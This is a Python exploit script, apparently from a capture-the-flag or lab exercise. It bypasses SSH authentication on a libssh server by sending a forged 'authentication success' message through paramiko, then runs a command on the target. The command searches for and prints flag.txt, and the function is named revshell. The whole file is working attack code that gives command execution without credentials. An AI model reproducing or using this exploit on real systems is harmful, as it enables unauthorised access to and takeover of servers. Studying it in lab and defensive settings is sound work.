```python
#!/usr/bin/env python3
import sys
import paramiko
import socket
import logging
import os

# pip3 install paramiko==2.0.8


RHOST = "10.10.0.107"
RPORT = "22"

#logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)

logging.basicConfig(stream=sys.stdout)
bufsize = 2048


def execute(hostname, port, command):
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        client = transport.open_session(timeout=10)
        client.exec_command(command)

        # stdin = client.makefile("wb", bufsize)
        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile_stderr("rb", bufsize)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()

        return (output+error).decode()
    except paramiko.SSHException as e:
        logging.exception(e)
        logging.debug(
            "TCPForwarding disabled on remote server can't connect. Not Vulnerable")
    except socket.error:
        logging.debug("Unable to connect.")

    return None



def revshell():
    print(execute(RHOST, RPORT, "find / -name flag.txt -exec cat {} +"))
revshell()
```